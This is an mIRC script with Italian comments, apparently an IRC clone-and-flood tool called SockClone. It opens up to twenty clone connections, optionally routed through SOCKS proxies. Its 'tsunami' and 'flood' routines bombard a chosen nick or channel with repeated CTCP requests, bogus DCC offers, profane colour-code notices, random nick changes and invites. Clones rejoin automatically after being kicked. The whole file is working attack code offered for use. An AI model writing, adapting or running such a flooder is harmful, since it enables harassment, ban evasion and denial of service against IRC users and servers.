

on 1:connect:{
  sockclonecheck
  .timersockclonecheck 0 30 sockclonecheck
}
on 1:disconnect:{
  sockclonecheck
  .timersockclonecheck 0 30 sockclonecheck
}
alias sockclone { 
  if ($3 == $null) {
    echo -a %sockclone.prompt COMANDO:
    echo -a /SockClone <quanti> <server (IP per usare firewall)> <porta> <SOCKS opzionale>
  }
  if (($1 <= 0) || ($1 > 20)) { echo -a %sockclone.prompt Numero di Cloni deve essere fra 1 e 20 | halt }
  inc %sockclone-number $1
  .timer $1 5 sockclone.connect $2 $3 $4
  .timersockclonecheck 0 30 sockclonecheck
}
alias sockclonecheck {
  if (($sock(sockclone1) == $null) && ($sock(sockclone2) == $null) && ($sock(sockclone3) == $null) && ($sock(sockclone4) == $null) && ($sock(sockclone5) == $null) && ($sock(sockclone6) == $null) && ($sock(sockclone7) == $null) && ($sock(sockclone8) == $null) && ($sock(sockclone9) == $null) && ($sock(sockclone10) == $null) && ($sock(sockclone11) == $null) && ($sock(sockclone12) == $null) && ($sock(sockclone13) == $null) && ($sock(sockclone14) == $null) && ($sock(sockclone15) == $null) && ($sock(sockclone16) == $null) && ($sock(sockclone17) == $null) && ($sock(sockclone18) == $null)) {
    if (($sock(sockclone19) == $null) && ($sock(sockclone20) == $null)) {
      sockclone.die -CHECK-
    }
  }
}
alias sockclone.connect {
  inc %sockclone-inc 1
  if ($3 == $null) {
    unset %sockclone-portH- [ $+ [ %sockclone-inc ] ]
    unset %sockclone-portL- [ $+ [ %sockclone-inc ] ]
    unset %sockclone-srv- [ $+ [ %sockclone-inc ] ]
    sockopen SockClone [ $+ [ %sockclone-inc ] ] $1 $2
    ;    echo -a azz srv
  }
  else {
    set %sockclone-portH- [ $+ [ %sockclone-inc ] ] $int( $calc( $2 / 256 ) )
    ;byte alto porta
    set %sockclone-portL- [ $+ [ %sockclone-inc ] ] $int( $calc( $2 % 256 ) )
    ;byte basso porta
    set %sockclone-srv- [ $+ [ %sockclone-inc ] ] $1                     
    ;SERVER (indirizzo IP)
    sockopen SockClone [ $+ [ %sockclone-inc ] ] $3 1080             
    ;apri connessione a fw:1080
    ;    echo -a ok sock
  }
}
alias sockclone.tsunami {
  if (%sockclone-number == $null) { echo -a %sockclone.prompt Nessun clone in esecuzione, abilitarli. | halt }
  if ($1 == $null) { echo -a %sockclone.prompt Specificare un nick/#canale per il flood | halt }
  set %sockclone-loop 0
  :tsustart
  inc %sockclone-loop 1
  if (%sockclone-loop > 20) { unset %sockclone-loop | halt }
  else { 
    set %sockclone-temp SockClone [ $+ [ %sockclone-loop ] ]
    if ($sock(%sockclone-temp).rcvd == 0) { goto start }
    if ($sock(SockClone [ $+ [ %sockclone-loop ] ] ) != $null) { 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
    }
  }
  goto tsustart
}

alias sockclone.flood {
  if (%sockclone-number == $null) { echo -a %sockclone.prompt Nessun clone in esecuzione, abilitarli. | halt }
  if ($1 == $null) { echo -a %sockclone.prompt Specificare nick/#canale per il flood | halt }
  set %sockclone-loop 0
  :start
  inc %sockclone-loop 1
  if (%sockclone-loop > 20) { unset %sockclone-loop | halt }
  else { 
    set %sockclone-temp SockClone [ $+ [ %sockclone-loop ] ]
    if ($sock(%sockclone-temp).rcvd == 0) { goto start }
    if ($sock(SockClone [ $+ [ %sockclone-loop ] ] ) != $null) { 
      .timer 1 1 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] NICK $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)
      .timer 1 3 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 VERSION 
      .timer 1 5 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 PING 
      .timer 1 7 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 ECHO 6FUCK4YOU6FUCK4YOU6FUCK4YOU6FUCK4YOU6FUCK4YOU 
      .timer 1 9 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 USERINFO 
      .timer 1 11 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 CLIENTINFO 
      .timer 1 13 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :DCC CHAT 000000000 000 000 25 
      .timer 1 15 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :DCC SEND FucK.YoU 3353362454 25 666
      .timer 1 17 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] NOTICE $1 4,14!7¡8!9¡11!13¡4!7¡8!9¡11!13¡4!7¡8!9¡11!13¡4!7¡4,14!7¡8!9¡11!13¡4F7U8C9K11U13¡4!7¡4!7¡8!9¡11!13¡4!7¡8!9¡11!13¡4!7¡4,14!7¡8!9¡11!13¡4!7¡4!8!9¡
      .timer 1 19 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] INVITE $1 #PIZZA
      .timer 1 21 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] NICK $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)
      .timer 1 23 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 VERSION 
      .timer 1 25 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 PING 
      .timer 1 27 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 ECHO 6FUCK4YOU6FUCK4YOU6FUCK4YOU6FUCK4YOU6FUCK4YOU 
      .timer 1 29 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 USERINFO 
      .timer 1 31 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 CLIENTINFO 
      .timer 1 33 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :DCC CHAT 000000000 000 000 25 
      .timer 1 35 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :DCC SEND FucK.YoU 3353362454 25 666
      .timer 1 37 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] NOTICE $1 4,14!7¡8!9¡11!13¡4!7¡8!9¡11!13¡4!7¡8!9¡11!13¡4!7¡4,14!7¡8!9¡11!13¡4F7U8C9K11U13¡4!7¡4!7¡8!9¡11!13¡4!7¡8!9¡11!13¡4!7¡4,14!7¡8!9¡11!13¡4!7¡4!8!9¡
      .timer 1 39 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] INVITE $1 #PIZZA
      .timer 1 41 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] NICK $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)
      .timer 1 43 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 VERSION 
      .timer 1 45 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 PING 
      .timer 1 47 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 ECHO 6FUCK4YOU6FUCK4YOU6FUCK4YOU6FUCK4YOU6FUCK4YOU 
      .timer 1 49 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 USERINFO 
      .timer 1 51 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 CLIENTINFO 
      .timer 1 53 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :DCC CHAT 000000000 000 000 25 
      .timer 1 55 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :DCC SEND FucK.YoU 3353362454 25 666
      .timer 1 57 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] NOTICE $1 4,14!7¡8!9¡11!13¡4!7¡8!9¡11!13¡4!7¡8!9¡11!13¡4!7¡4,14!7¡8!9¡11!13¡4F7U8C9K11U13¡4!7¡4!7¡8!9¡11!13¡4!7¡8!9¡11!13¡4!7¡4,14!7¡8!9¡11!13¡4!7¡4!8!9¡
      .timer 1 59 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] INVITE $1 #PIZZA
    }
  }
  goto start
}
alias sockclone.die {
  if ($1 == -Check-) {
    unset %sockclone-*
    .timersockclonecheck off
    halt
  }
  if (%sockclone-number == $null) { echo -a %sockclone.prompt Nessun clone in esecuzione, abilitarli. | halt }
  set %sockclone-loop 0
  :start
  inc %sockclone-loop 1
  if (%sockclone-loop > 20) { unset %sockclone-loop | unset %sockclone-* | .timersockclonecheck off | halt }
  else { 
    set %sockclone-temp SockClone [ $+ [ %sockclone-loop ] ]
    if ($sock(%sockclone-temp).rcvd == 0) { sockclose %sockclone-temp | goto start } 
    if ($sock(SockClone [ $+ [ %sockclone-loop ] ] ) != $null) { .sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] quit : $+ %sockclone.prompt by  8,1 F®åñ|<j Pø\\'eRz }
  }
  goto start
}
alias sockclone.command {
  if (%sockclone-number == $null) { echo -a %sockclone.prompt Nessun clone in esecuzione, abilitarli. | halt }
  if ($1 == $null) { echo -a %sockclone.prompt You need specify a command | halt }
  set %sockclone-loop 0
  :start
  inc %sockclone-loop 1
  if (%sockclone-loop > 20) { unset %sockclone-loop | halt }
  else { 
    set %sockclone-temp SockClone [ $+ [ %sockclone-loop ] ]
    if ($sock(%sockclone-temp).rcvd == 0) { goto start }
    if ($sock(SockClone [ $+ [ %sockclone-loop ] ] ) != $null) { sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] $1- }
  }
  goto start
}
on 1:sockopen:*:{
  ; $right($sockname,2)
  if (SockClone isin $sockname) {
    if ($right($sockname,2) isin 10-11-12-13-14-15-16-17-18-19-20) {
      %temp-azz = $right($sockname,2)
    }
    else {
      %temp-azz = $right($sockname,1)
    }
    if (%sockclone-portL- [ $+ [ %temp-azz ] ] != $null) {
      echo -a ------------ %temp-azz
      echo -a %sockclone-portH- [ $+ [ %temp-azz ] ] byte alto porta
      echo -a %sockclone-portL- [ $+ [ %temp-azz ] ] byte basso porta
      echo -a %sockclone-srv- [ $+ [ %temp-azz ] ] IP srv IRC
      echo -a $gettok(%sockclone-srv- [ $+ [ %temp-azz ] ] ,1,46) primo byte IP
      echo -a $gettok(%sockclone-srv- [ $+ [ %temp-azz ] ] ,2,46) secdo byte IP
      echo -a $gettok(%sockclone-srv- [ $+ [ %temp-azz ] ] ,3,46) terzo byte IP
      echo -a $gettok(%sockclone-srv- [ $+ [ %temp-azz ] ] ,4,46) quarto byte IP
      bset &binvar 1 4
      bset &binvar 2 1
      bset &binvar 3 %sockclone-portH- [ $+ [ %temp-azz ] ]
      bset &binvar 4 %sockclone-portL- [ $+ [ %temp-azz ] ]
      bset &binvar 5 $gettok(%sockclone-srv- [ $+ [ %temp-azz ] ] ,1,46)
      bset &binvar 6 $gettok(%sockclone-srv- [ $+ [ %temp-azz ] ] ,2,46)
      bset &binvar 7 $gettok(%sockclone-srv- [ $+ [ %temp-azz ] ] ,3,46)
      bset &binvar 8 $gettok(%sockclone-srv- [ $+ [ %temp-azz ] ] ,4,46)
      bset &binvar 9 0
      .sockwrite $sockname &binvar
      echo -a CLONE N $sockname : CONNESSO AL SOCKS, INVIO DATI BINARI CONNESSIONE . . .
    }
    else {
      sockwrite -tn $sockname USER 4,6PizzaBogus - - : $+ %sockclone.prompt  8,1 F®åñ|<j Pø\\'eRz
      set %temp.sock.nick $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z)
      sockwrite -tn $sockname NICK %temp.sock.nick $crlf
      unset %temp.sock.nick
      echo -a CLONE N $sockname : CONNESSO AL SERVER IRC
    }
  }
}
on 1:sockread:*:{
  if (SockClone isin $sockname) {
    sockread %sockclone-rcvd
    if ($mid(%sockclone-rcvd,2,1) == $chr(90)) {
      sockwrite -tn $sockname USER 4,6PizzaBogus - - : $+ %sockclone.prompt  8,1 F®åñ|<j Pø\\'eRz
      set %temp.sock.nick $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z)
      sockwrite -tn $sockname NICK %temp.sock.nick
      unset %temp.sock.nick
      echo -a CLONE N $sockname : CONNESSO AL SERVER IRC
    }
    if ($mid(%sockclone-rcvd,2,1) == $chr(91)) {
      sockclose $sockname
      echo -a CLONE N $sockname : CONNESSIONE RIFIUTATA DA SOCKS
    }
    if ($left(%sockclone-rcvd,6) == PING $+ $chr(32) $+ :) {
      sockwrite -tn $sockname PONG $mid(%sockclone-rcvd,6,$len(%sockclone-rcvd))
    }
    if (KICK isin $gettok(%sockclone-rcvd,2,32)) {
      sockwrite -tn $sockname JOIN $gettok(%sockclone-rcvd,3,32)}
    }
  }
}
;menu menubar {
;  -
;  &SockClone 
;    .&Connect:sockclone $?="How many? (Ex: 5)" $?="Server Address:" $?="Port:"
;  .&Disconnect:sockclone.die
;  .&Join a channel:sockclone.command JOIN : $+ $?="#Channel" $?="Key?"
;  .&Part a channel:sockclone.command PART: $+ $?="#Channel" $?="Msg?"
;  .&Message Nick/#Channel:sockclone.command privmsg $?="Nick/#Channel" : $+ $?="Message"
;  .&Notice Nick/#Channel:sockclone.command notice $?="Nick/#Channel" : $+ $?="Notice"
;  .&Flood Someone:sockclone.flood $?="Nick/Channel"
;  .&Command:sockclone.command $?="Command:"
;}
